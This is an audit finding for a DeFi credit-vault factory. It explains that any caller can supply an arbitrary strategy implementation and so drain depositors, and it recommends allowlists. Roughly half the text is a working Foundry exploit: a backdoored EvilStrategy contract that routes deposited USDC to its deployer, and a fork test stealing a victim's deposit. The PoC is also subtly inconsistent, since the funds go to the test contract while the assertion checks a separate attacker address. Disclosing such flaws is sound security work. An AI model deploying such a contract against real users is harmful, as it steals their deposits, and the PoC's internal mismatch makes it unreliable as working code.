### Title
Permissionless factory deploys attacker-controlled strategy implementations, enabling theft of all vault deposits - ([File: contracts/IdleCreditVaultFactory.sol](contracts/IdleCreditVaultFactory.sol))

### Summary
`IdleCreditVaultFactory.deployCreditVault` is callable by any EOA and accepts an arbitrary `strategyData.implementation`. The factory deploys a `TransparentUpgradeableProxy` pointing to that attacker-supplied implementation and immediately delegatecalls its `initialize` function with fixed arguments. This is the direct on-chain analogue of an environment-controlled executable path: the attacker chooses the code while the factory executes it in a protocol-created proxy.

A malicious strategy implementation can preserve the expected interface, pass deployment, receive ownership/configuration calls normally, and then steal every underlying token deposited through the resulting credit vault because the CDO grants the strategy unlimited underlying-token allowance.

### Finding Description
`deployCreditVault` has no caller restriction or implementation allowlist. It forwards `strategyData.implementation` directly to `_deployProxy`. [1](#0-0) [2](#0-1) 

`_deployProxy` constructs `TransparentUpgradeableProxy(implementation, proxyAdmin, data)`, causing the supplied implementation's initializer to execute through `delegatecall` in the new proxy's storage context. [3](#0-2) 

The subsequently deployed CDO treats the malicious proxy as its strategy, deploys legitimate tranche tokens around it, and grants it unlimited allowances for both the underlying token and strategy token. [4](#0-3) 

During a user deposit, the CDO first transfers underlying tokens from the depositor to itself and then calls `IIdleCDOStrategy(strategy).deposit(_amount)`. [5](#0-4)  A malicious strategy can use the previously granted allowance to forward those tokens to the attacker while still minting accounting-compatible strategy tokens to the CDO.

The emitted `CreditVaultDeployed` event contains only deployed contract addresses and does not disclose the strategy implementation, making a malicious deployment difficult to distinguish from a factory-produced legitimate deployment without inspecting the proxy's implementation slot. [6](#0-5) 

### Impact Explanation
An attacker can deploy a backdoored strategy while configuring the deployed credit vault with honest owner, manager, borrower, fee receiver, underlying token, tranche token, and CDO implementation. Every lender deposit into that deployment can be stolen in the same transaction as `depositAA` or `depositBB`.

For example, a victim depositing `1,000,000 USDC` loses the full `1,000,000 USDC`; the attacker receives it while the victim receives economically worthless tranche tokens backed only by malicious strategy-token accounting.

### Likelihood Explanation
The deployment path is fully permissionless and requires no privileged role. The only external condition is that a victim interacts with the attacker-created vault. Because the factory emits a standard deployment event and assigns ownership to the configured treasury, the deployment can appear legitimate even though its implementation was attacker-selected.

Existing canonical deployments are not directly compromised by this issue; exploitation affects users who deposit into malicious deployments produced through this factory path.

### Recommendation
Do not accept implementation addresses from callers. Restrict `deployCreditVault` and `deployRevolvingCreditVault` to a trusted treasury/owner, or store approved implementation addresses/hashes in the factory and deploy only those implementations.

At minimum:

- Add an explicit allowlist for CDO, strategy, queue, write-off escrow, and programmable-borrower implementations.
- Emit the implementation addresses in `CreditVaultDeployed`.
- Prefer immutable beacon/minimal-proxy clones over arbitrary `TransparentUpgradeableProxy` targets.
- Validate programmable-borrower vault addresses against an approved registry rather than accepting arbitrary ERC4626 contracts.

### Proof of Concept
The following Foundry test demonstrates the full flow on a mainnet fork. The malicious implementation preserves the strategy interface and steals each deposited USDC atomically.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import "@openzeppelin/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/token/ERC20/utils/SafeERC20Upgradeable.sol";

import "../contracts/IdleCreditVaultFactory.sol";
import "../contracts/IdleCDOEpochVariant.sol";
import "../contracts/interfaces/IERC20Detailed.sol";

contract EvilStrategy is Initializable, OwnableUpgradeable, ERC20Upgradeable {
    using SafeERC20Upgradeable for IERC20Detailed;

    address public immutable rigger;
    IERC20Detailed public underlyingToken;
    address public token;
    address public idleCDO;
    address public manager;
    address public borrower;

    constructor() {
        rigger = msg.sender;
        _disableInitializers();
    }

    // Same selector as IdleCreditVault.initialize.
    function initialize(
        address _underlyingToken,
        address _owner,
        address _manager,
        address _borrower,
        string memory borrowerName,
        uint256
    ) external initializer {
        __Ownable_init();
        __ERC20_init(
            string(abi.encodePacked("Pareto Credit Vault ", borrowerName)),
            borrowerName
        );

        token = _underlyingToken;
        underlyingToken = IERC20Detailed(_underlyingToken);
        manager = _manager;
        borrower = _borrower;
        transferOwnership(_owner);
    }

    function decimals() public view override returns (uint8) {
        return underlyingToken.decimals();
    }

    function strategyToken() external view returns (address) {
        return address(this);
    }

    function getApr() external pure returns (uint256) {
        return 0;
    }

    function setAprs(uint256, uint256) external {}
    function setAprsWithBuffer(uint256, uint256, uint256) external {}

    function setWhitelistedCDO(address _cdo) external {
        idleCDO = _cdo;
    }

    // The CDO calls this after receiving the lender's underlying tokens.
    function deposit(uint256 amount) external returns (uint256) {
        // Pull the CDO-held deposit through the allowance granted at CDO initialization.
        underlyingToken.safeTransferFrom(msg.sender, rigger, amount);

        // Keep CDO accounting superficially consistent so deposits and minting succeed.
        _mint(msg.sender, amount);
        return amount;
    }
}

contract FactoryArbitraryImplementationTest is Test {
    bytes32 internal constant DEPLOYED_EVENT =
        keccak256("CreditVaultDeployed(address,address,address,address,address,address)");

    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    IdleCreditVaultFactory internal factory;
    address internal attacker = makeAddr("attacker");
    address internal treasury = makeAddr("honestTreasury");
    address internal proxyAdmin = makeAddr("proxyAdmin");
    address internal manager = makeAddr("honestManager");
    address internal borrower = makeAddr("honestBorrower");
    address internal victim = makeAddr("victim");

    function testMaliciousStrategyStealsDeposit() public {
        vm.createSelectFork("mainnet");

        IdleCreditVaultFactory factoryImpl = new IdleCreditVaultFactory();
        factory = IdleCreditVaultFactory(address(new TransparentUpgradeableProxy(
            address(factoryImpl),
            proxyAdmin,
            abi.encodeWithSelector(
                IdleCreditVaultFactory.initialize.selector,
                treasury,
                proxyAdmin
            )
        )));

        EvilStrategy evilImpl = new EvilStrategy();
        IdleCDOEpochVariant cdoImpl = new IdleCDOEpochVariant();

        IdleCreditVaultFactory.CreditVaultParams memory cvParams =
            IdleCreditVaultFactory.CreditVaultParams({
                implementation: address(cdoImpl),
                limit: 0,
                underlying: USDC,
                apr: 10e18,
                epochDuration: 30 days,
                bufferPeriod: 5 days,
                instantWithdrawDelay: 3 days,
                instantWithdrawAprDelta: 1e18,
                disableInstantWithdraw: true,
                keyringPolicy: 0,
                feeReceiver: treasury,
                fees: 5_000,
                managementFee: 500,
                isInterestMinted: false,
                isDepositDuringEpochDisabled: true
            });

        IdleCreditVaultFactory.StrategyData memory strategyData =
            IdleCreditVaultFactory.StrategyData({
                implementation: address(evilImpl),
                manager: manager,
                borrower: borrower,
                borrowerName: "honestBorrower"
            });

        IdleCreditVaultFactory.AncillaryParams memory ancillary =
            IdleCreditVaultFactory.AncillaryParams({
                keyring: address(0),
                queueImplementation: address(0),
                prefundedDepositWindow: 0,
                writeOffImplementation: address(0)
            });

        vm.recordLogs();
        vm.prank(attacker);
        factory.deployCreditVault(cvParams, strategyData, ancillary);

        address cv;
        Vm.Log[] memory logs = vm.getRecordedLogs();
        for (uint256 i = 0; i < logs.length; ++i) {
            if (logs[i].topics[0] == DEPLOYED_EVENT) {
                (cv,,,,,) = abi.decode(
                    logs[i].data,
                    (address, address, address, address, address, address)
                );
            }
        }
        assertTrue(cv != address(0));

        uint256 amount = 1_000_000e6;
        deal(USDC, victim, amount);

        vm.startPrank(victim);
        IERC20Detailed(USDC).approve(cv, type(uint256).max);
        IdleCDOEpochVariant(cv).depositAA(amount);
        vm.stopPrank();

        assertEq(IERC20Detailed(USDC).balanceOf(attacker), amount);
        assertEq(IERC20Detailed(USDC).balanceOf(cv), 0);
    }
}
```
